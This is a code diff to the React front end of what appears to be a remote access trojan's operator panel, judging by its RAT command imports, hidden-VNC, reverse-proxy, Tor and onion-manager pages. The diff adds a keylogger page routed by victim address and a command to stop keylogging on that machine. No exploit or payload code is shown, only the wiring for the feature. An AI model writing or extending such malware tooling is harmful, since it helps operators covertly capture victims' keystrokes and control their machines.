@@ -18,6 +18,7 @@ import {
   stopReverseProxyCmd,
   stopShellCmd,
   manageHVNC,
+  stopKeyloggerCmd,
 } from "./rat/RATCommands";
 import { HVNC } from "./pages/HVNC";
 import { WorldMap } from "./pages/WorldMap";
@@ -26,6 +27,7 @@ import { InputBox } from "./pages/InputBox";
 import { OnionManager } from "./pages/OnionManager";
 import { TorStartupModal } from "./components/TorStartupModal";
 import { useLocation } from "react-router-dom";
+import { Keylogger } from "./pages/Keylogger";
 
 const TorStartupModalContainer: React.FC = () => {
   const location = useLocation();
@@ -125,6 +127,20 @@ export const App: React.FC = () => {
           element={
             <WindowWrapper feature_cleanup={() => {}}>
               <InputBox />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/keylogger/:addr"
+          element={
+            <WindowWrapper
+              feature_cleanup={(params) => {
+                if (params.addr) {
+                  stopKeyloggerCmd(params.addr);
+                }
+              }}
+            >
+              <Keylogger />
             </WindowWrapper>
           }
         />
